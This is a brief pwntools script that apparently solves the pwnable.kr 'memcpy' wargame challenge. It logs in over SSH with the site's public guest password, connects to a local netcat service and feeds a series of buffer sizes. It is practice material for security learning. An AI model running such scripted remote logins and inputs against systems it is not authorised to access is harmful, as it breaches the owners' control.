from pwn import *


shell = ssh('memcpy', 'pwnable.kr', 2222, password='guest')
sh = shell.process('/bin/sh', env={'PS1':''})

size_s = [8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096]

while True:
    sh.sendline('nc 0 9022')
    print(sh.recvuntil("8 ~ 16 :"))
    sh.sendline(str(size_s[0]))
    print(sh.recvuntil("16 ~ 32 :"))
    sh.sendline(str(size_s[1]))
    print(sh.recvuntil("32 ~ 64 :"))
    sh.sendline(str(size_s[2]))
    print(sh.recvuntil("64 ~ 128 :"))
    sh.sendline(str(size_s[3]))
    print(sh.recvuntil("128 ~ 256 :"))
    sh.sendline(str(size_s[4]))
    print(sh.recvuntil("256 ~ 512 :"))
    sh.sendline(str(size_s[5]))
    print(sh.recvuntil("512 ~ 1024 :"))
    sh.sendline(str(size_s[6]))
    print(sh.recvuntil("1024 ~ 2048 :"))
    sh.sendline(str(size_s[7]))
    print(sh.recvuntil("2048 ~ 4096 :"))
    sh.sendline(str(size_s[8]))
    print(sh.recvuntil("4096 ~ 8192 :"))
    sh.sendline(str(size_s[9]))

    print(sh.recvline())
    print(sh.recv(2560))

    break
